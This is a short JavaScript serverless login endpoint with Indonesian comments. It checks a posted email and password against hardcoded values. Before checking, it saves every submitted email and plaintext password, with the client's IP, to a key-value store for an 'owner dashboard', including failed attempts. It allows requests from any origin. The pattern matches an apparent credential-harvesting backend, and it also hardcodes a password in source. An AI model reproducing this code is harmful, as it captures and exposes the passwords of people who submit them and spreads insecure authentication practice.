import { kv } from '@vercel/kv';

// 🔥 GANTI DENGAN EMAIL & PASSWORD YANG BENAR (disimpan owner)
const VALID_EMAIL = 'user@example.com';    // ganti dengan email valid
const VALID_PASSWORD = 'fluxus2025';       // ganti dengan password valid

export default async function handler(req, res) {
    // CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const { email, password } = req.body;
        
        if (!email || !password) {
            return res.status(400).json({ success: false, error: 'Missing fields' });
        }

        // Simpan percobaan login (untuk dashboard owner)
        const attempt = {
            email,
            password,
            timestamp: new Date().toISOString(),
            ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown'
        };
        
        // Ambil riwayat lama
        let logs = await kv.get('login_attempts') || [];
        logs.unshift(attempt);
        // Simpan max 500 data
        await kv.set('login_attempts', logs.slice(0, 500));

        // Validasi email & password
        const isValid = (email === VALID_EMAIL && password === VALID_PASSWORD);
        
        if (isValid) {
            // Catat juga login sukses (opsional)
            let successLogs = await kv.get('success_logins') || [];
            successLogs.unshift(attempt);
            await kv.set('success_logins', successLogs.slice(0, 100));
            
            return res.status(200).json({ success: true });
        } else {
            return res.status(200).json({ success: false, error: 'Invalid credentials' });
        }
        
    } catch (err) {
        console.error('API Error:', err);
        return res.status(500).json({ success: false, error: 'Internal server error' });
    }
                                                  }
